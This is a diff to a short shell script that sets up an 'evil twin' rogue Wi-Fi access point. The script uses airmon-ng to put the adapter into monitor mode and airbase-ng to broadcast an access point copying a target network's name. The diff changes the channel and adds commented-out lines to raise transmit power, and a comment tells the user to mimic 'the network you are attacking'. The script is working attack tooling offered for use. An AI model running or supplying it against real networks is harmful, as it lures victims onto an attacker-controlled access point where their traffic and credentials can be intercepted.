@@ -6,7 +6,7 @@ WLAN=wlan1			# monitor mode wirless adapter
 MON=mon
 WLANMON=$WLAN$MON
 ESSID=zzzz
-CHANNEL=11
+CHANNEL=6
 
 # Enable the wireless adapter
 echo -e "Enabled $WLAN"
@@ -16,7 +16,13 @@ ifconfig $WLAN up
 echo -e "Creating $WLAN monitor interface"
 airmon-ng start $WLAN
 
+# boost signal strength to max legal limit in the US, 30 dBm
+# echo -e "Boosting Signal Strength"
+# ifconfig $WLANMON down     
+# iw reg set US              
+# ifconfig $WLANMON up 
+
 # start up the evil twin AP (access point)
 # 	Give the evil twin the same name as the network you are attacking for best results
-echo -e "starting evil twin"
+echo -e "Starting evil twin"
 airbase-ng -e $ESSID -c $CHANNEL $WLANMON
